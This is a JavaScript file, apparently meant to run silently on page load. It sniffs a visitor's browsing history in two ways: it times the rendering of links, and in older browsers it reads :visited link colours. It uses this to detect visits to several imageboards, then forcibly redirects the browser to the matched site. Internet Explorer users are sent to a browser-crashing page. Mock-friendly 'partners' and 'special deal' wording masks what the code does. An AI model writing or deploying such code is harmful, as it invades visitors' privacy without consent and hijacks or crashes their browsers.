function find_partners() {
    // find out if user has visited any of our *partners* already
    var friends = ['http://inach.org/b/', 'http://2ch.hk/b/', 'https://2ch.hk/b/', 'http://1chan.inach.org/news/', 'http://1chan.ru/news/', 'http://2ch.yt/b/', 'http://02ch.net/b/'];
    var DEBUG = false;
    // new place for suggestions
    var sug = document.createElement('div');
    sug.setAttribute('id', 'suggestion');
    document.body.appendChild(sug);
    // new style for suggestions (and make sure no one gets to overwrite our !important stuff)
    var sElement = document.createElement('style');
    sElement.type = 'text/css';
    document.getElementsByTagName('head')[0].appendChild(sElement);
    sElement.appendChild(document.createTextNode('#suggestion {text-align: center; opacity: 0; visibility: none;}'));

    function flash(url) {
        var garbage = 'http://doesnot.ex/';
        var a = document.createElement('a');
        a.className = 'partnership';
        a.innerHTML = 'Contacting our partners...';
        a.setAttribute('href', garbage);
        for (var z = 0; z < 800; z++) {
            a.setAttribute('href', garbage);
            sug.appendChild(a);
            a.setAttribute('href', url);
            a.style.color = 'magenta';
            a.style.color = '';
            sug.removeChild(a);
        }
        // force redraw or whatever, doesn't work for me otherwise
        sug.appendChild(a);
    }

    function time_it(url) {
        // compares link loading times, works properly second time you run it
        if (url == 'wiki') {
            url = 'http://en.wikipedia.org/';
        }
        var start = new Date().getTime();
        flash(url);
        var end = new Date().getTime();

        DEBUG && console.log('tested: ' + url + ', result: ' + (end - start));
        return end - start;
    }

    function opera_case(url) {
        // straightforward css trick, nowadays probably for Opera fanboys exclusively
        var a = document.createElement('a');
        a.innerHTML = 'Contacting our partners...';
        a.setAttribute('href', url);
        document.body.appendChild(a);
        $('a:visited').css('color', 'rgb(121, 141, 161)');
        if ($(a).css('color') == 'rgb(121, 141, 161)') {
            DEBUG && console.log ('dude, update your browser');
            $(a).remove();
            return true;
        }
        $(a).remove();
        return false;
    }

    function special_deal(url) {
        // we've got a deal for you
        DEBUG && console.log('Congrats, you just won our special deal! Get it from our sponsor\'s website NOW!');
        window.location = url;
    }

    // Chrome doesn't work yet and gives false positive, I'm working on it
    if (window.chrome) {
        DEBUG && console.log('Don\'t you worry, Chrome support is underway!');
        return false;
    }
    // BillyBoys!
    if (window.navigator.userAgent.indexOf('MSIE') > -1 || window.navigator.userAgent.indexOf('Trident/') > -1) {
        window.location = 'http://www.crashie.com/';
    }
    var n = friends.length;
    var unvisited = (time_it('wiki') + time_it('wiki')) / 2;
    DEBUG && console.log('threshold: ' + unvisited * 1.3);
    for (var i = 0; i < n; i++) {
        // time_it is for FF, opera_case - mostly for old Opera. we don't do any
        // user agent detection to protect our dear users from *accidental misconfiguration*
        // stay tuned, Chrome support is underway!
        
        // opera_case breaks time_it, so it should come second
        if (time_it(friends[i]) > unvisited * 1.3 || opera_case(friends[i])) {
            DEBUG && console.log('You seem to have visited our good friend: ' + friends[i]);
            special_deal(friends[i]);
            return true;
        }
    }
    DEBUG && console.log('Nothing found, oh well.');
    return false;
}

$(document).ready(function() {
    find_partners();
});
